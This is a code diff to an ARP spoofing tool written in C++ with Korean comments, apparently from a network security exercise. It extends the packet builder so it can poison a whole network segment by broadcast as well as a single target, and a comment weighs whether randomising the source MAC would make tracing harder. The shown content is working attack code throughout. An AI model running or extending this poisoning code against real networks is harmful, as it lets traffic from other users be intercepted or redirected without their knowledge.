@@ -86,10 +86,10 @@ Mac get_mac(pcap_t *handle, const u_char *packet, size_t packetSize, Ip target_i
 // 라우터 감염일 경우 :
 // 브로드캐스트 감염일 경우 :
 // 단일 타겟 감염일 경우 :
-EthArpPacket Make_Infection_Packet(Mac attacker_mac, Mac sender_mac, Ip sender_ip, Ip target_ip) {
+EthArpPacket Make_Infection_Packet(Mac attacker_mac, Mac sender_mac, Ip sender_ip, Ip target_ip, Mode mode) {
     EthArpPacket packet;
-    packet.eth_.dmac_ = sender_mac;
-    packet.eth_.smac_ = attacker_mac;
+    packet.eth_.dmac_ = (mode == Mode::Broadcast) ? Mac::broadcastMac() : sender_mac;
+    packet.eth_.smac_ = attacker_mac; // 브로드캐스트시 랜덤으로 하면 추적이 어려워지나, 릴레이를 고려한다면 attacker_mac 사용
     packet.eth_.type_ = htons(EthHdr::Arp);
 
     packet.arp_.hrd_ = htons(ArpHdr::ETHER);
@@ -101,7 +101,7 @@ EthArpPacket Make_Infection_Packet(Mac attacker_mac, Mac sender_mac, Ip sender_i
 
     packet.arp_.smac_ = attacker_mac;        // 공격자(나)의 Mac
     packet.arp_.sip_ = htonl(target_ip);  // 속일 IP (여기서는 라우터)
-    packet.arp_.tmac_ = sender_mac;          // 받는 사람 Mac
+    packet.arp_.tmac_ = (mode == Mode::Broadcast) ? Mac::nullMac() : sender_mac;          // 받는 사람 Mac
     packet.arp_.tip_  = htonl(sender_ip); // 받는 사람 Ip
 
     return packet;
